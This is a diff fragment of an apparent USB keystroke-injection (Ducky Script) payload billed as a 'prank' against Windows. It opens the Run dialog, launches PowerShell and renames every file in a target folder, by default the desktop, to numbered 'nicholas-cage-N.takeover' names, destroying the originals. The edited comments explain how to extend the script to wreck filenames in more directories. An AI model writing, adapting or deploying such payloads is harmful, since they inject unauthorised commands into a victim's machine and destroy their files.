@@ -5,7 +5,8 @@ REM Target: Windows / Powershell
 REM Version: 1.0
 REM Category: Prank
 
-REM ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 19 to 26, and paste directly below these lines, changing the target directory name.
+REM ~~~~~ TO DESTROY FURTHER FILENAMES: Copy everything from line 22 to 27, and paste in the space provided, changing the target directory name.
+REM ~~~~~ CAN RUN SCRIPT 'AS IS' (WITHOUT CHANGES) - Will just attack files on the desktop
 
 DELAY 1000
 GUI r
@@ -26,7 +27,7 @@ STRING  dir | %{Rename-Item $_ -NewName ("nicholas-cage-{0}.takeover" -f $nr++)}
 ENTER
 DELAY 200
 
-REM ~~~~~~~~~~ END OF LINES TO REPEAT. COPY ALL ABOVE AND PASTE BELOW WITH THE DIRECTORY CHANGED ~~~~~~~~~~
+REM ~~~~~~~~~~ END OF LINES TO REPEAT ~~~~~~~~~~
 
 REM            SPACE TO PASTE FURTHER TAKEOVERS (YOU CAN DELETE THIS LINE IF DESIRED)
 
